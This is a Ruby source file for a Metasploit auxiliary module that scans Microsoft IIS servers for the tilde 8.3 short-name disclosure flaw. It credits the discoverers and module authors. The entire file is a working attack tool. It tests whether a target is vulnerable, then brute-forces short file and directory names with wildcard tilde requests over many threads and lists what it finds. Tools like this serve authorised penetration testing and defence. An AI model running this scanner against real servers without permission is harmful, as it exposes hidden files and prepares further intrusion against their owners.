##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Rex::Proto::Http

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Microsoft IIS shortname vulnerability scanner',
        'Description' => %q{
         The vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which
         could allow remote attackers to diclose 8.3 filenames (short names). In 2010, Soroush Dalili
         and Ali Abbasnejad discovered the original bug (GET request). This was publicly disclosed in
         2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS.
        },
        'Author'         =>
          [
          'Soroush Dalili', # Vulnerability discovery
          'Ali Abbasnejad', # Vulnerability discovery
          'MinatoTW <shaks19jais[at]gmail.com>', # Metasploit module
          'egre55 <ianaustin[at]protonmail.com>' # Metasploit module
          ],
        'License'     => MSF_LICENSE,
        'References'     =>
          [
            [ 'URL', 'https://soroush.secproject.com/blog/tag/iis-tilde-vulnerability' ],
            [ 'URL', 'https://support.detectify.com/customer/portal/articles/1711520-microsoft-iis-tilde-vulnerability' ]
          ],
        'Targets' => [[ 'Automatic', {} ]]
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('PATH', [ true, "The base path to start scanning from", "/" ]),
      OptInt.new('THREADS', [ true, "Number of threads to use", 20])
    ])
    @dirs = []
    @files = []
    @threads = []
    @queue = Queue.new
    @queue_ext = Queue.new
    @alpha = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\'()-@^_`{}'
    @charset_names = []
    @charset_extensions = []
    @charset_duplicates = []
    @verb = ""
    @name_size= 6
    @path = ""
  end

  def check
    is_vul ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  rescue Rex::ConnectionError
    print_bad("Failed to connect to target")
  end

  def is_vul
    @path = datastore['PATH']
    for method in ['GET', 'OPTIONS']
      # Check for existing file
      res1 = send_request_cgi({
        'uri' => normalize_uri(@path, '*~1*'),
        'method' => method
      })

      # Check for non-existing file
      res2 = send_request_cgi({
        'uri' => normalize_uri(@path,'QYKWO*~1*'),
        'method' => method
      })

      if res1 && res1.code == 404 && res2 && res2.code != 404
        @verb = method
        return true
      end
    end
    return false
  rescue Rex::ConnectionError
    print_bad("Failed to connect to target")
  end

  def get_status(f , digit , match)
    # Get response code for a file/folder
    res2 = send_request_cgi({
      'uri' => normalize_uri(@path,"#{f}#{match}~#{digit}#{match}"),
      'method' => @verb
    })
    return res2.code
  rescue NoMethodError
      print_error("Unable to connect to #{datastore['RHOST']}")
  end

  def get_incomplete_status(url, match, digit , ext)
    # Check if the file/folder name is more than 6 by using wildcards
    res2 = send_request_cgi({
      'uri' => normalize_uri(@path,"#{url}#{match}~#{digit}.#{ext}*"),
      'method' => @verb
    })
    return res2.code
  rescue NoMethodError
      print_error("Unable to connect to #{datastore['RHOST']}")
  end

  def get_complete_status(url, digit , ext)
    # Check if the file/folder name is less than 6 and complete
    res2 = send_request_cgi({
      'uri' => normalize_uri(@path,"#{url}*~#{digit}.#{ext}"),
      'method' => @verb
    })
    return res2.code
  rescue NoMethodError
      print_error("Unable to connect to #{datastore['RHOST']}")
  end

  def scanner
    while !@queue_ext.empty?
      f = @queue_ext.pop
      url = f.split(':')[0]
      ext = f.split(':')[1]
      # Split string into name and extension and check status
      status = get_incomplete_status(url, "*" , "1" , ext)
      next unless status == 404
      next unless ext.size <= 3

      @charset_duplicates.each do |x|
        if get_complete_status(url, x , ext) == 404
          @files << "#{url}*~#{x}.#{ext}*"
        end
      end

      if ext.size < 3
        for c in @charset_extensions
          @queue_ext << (f + c )
        end
      end
    end
  end

  def scan
    while !@queue.empty?
      url = @queue.pop
      status = get_status(url , "1" , "*")
      # Check strings only upto 6 chars in length
      next unless status == 404
      if url.size == @name_size
        @charset_duplicates.each do |x|
          if get_status(url , x , "") == 404
            @dirs << "#{url}*~#{x}"
          end
        end
        # If a url exists then add to new queue for extension scan
        for ext in @charset_extensions
          @queue_ext << ( url + ':' + ext )
          @threads << framework.threads.spawn("scanner", false) { scanner }
        end
      else
        @charset_duplicates.each do |x|
          if get_complete_status(url, x , "") == 404
            @dirs << "#{url}*~#{x}"
            break
          end
        end
        if get_incomplete_status(url, "" , "1" , "") == 404
          for ext in @charset_extensions
            @queue_ext << ( url + ':' + ext )
            @threads << framework.threads.spawn("scanner", false) { scanner }
          end
        elsif url.size < @name_size
          for c in @charset_names
            @queue  <<(url +c)
          end
        end
      end
    end
  end

  def reduce
    # Reduce the total charset for filenames by checking if a character exists in any of the files
    for c in @alpha.chars
      res = send_request_cgi({
        'uri' => normalize_uri(@path,"*#{c}*~1*"),
        'method' => @verb
      })
      if res && res.code == 404
        @charset_names << c
      end
    end
  end

  def ext
    # Reduce the total charset for extensions by checking if a character exists in any of the extensions
    for c in @alpha.chars
      res = send_request_cgi({
        'uri' => normalize_uri(@path,"*~1.*#{c}*"),
        'method' => @verb
      })
      if res && res.code == 404
        @charset_extensions << c
      end
    end
  end

  def dup
    # Reduce the total charset for duplicate files/folders
    array = [*('1'..'9')]
    array.each do |c|
      res = send_request_cgi({
        'uri' => normalize_uri(@path,"*~#{c}.*"),
        'method' => @verb
      })
      if res && res.code == 404
        @charset_duplicates << c
      end
    end
  end

  def run
    unless is_vul
      print_status("Target is not vulnerable, or no shortname scannable files are present.")
      return
    end
    unless @path.end_with? '/'
      @path += '/'
    end
    print_status("Scanning in progress...")
    @threads << framework.threads.spawn("reduce_names",false) { reduce }
    @threads << framework.threads.spawn("reduce_duplicates",false) { dup }
    @threads << framework.threads.spawn("reduce_extensions",false) { ext }
    @threads.each(&:join)

    for c in @charset_names
      @queue << c
    end

    datastore['THREADS'].times {
      @threads << framework.threads.spawn("scanner", false) { scan }
    }

    Rex.sleep(1) until @queue_ext.empty?

    @threads.each(&:join)

    proto = datastore['SSL'] ? 'https' : 'http'

    if @dirs.empty?
      print_status("No directories were found")
    else
      print_good("Found #{@dirs.size} directories")
      @dirs.each do |x|
        print_good("#{proto}://#{datastore['RHOST']}#{@path}#{x}")
      end
    end

    if @files.empty?
      print_status("No files were found")
    else
      print_good("Found #{@files.size} files")
      @files.each do |x|
        print_good("#{proto}://#{datastore['RHOST']}#{@path}#{x}")
      end
    end
  end
end

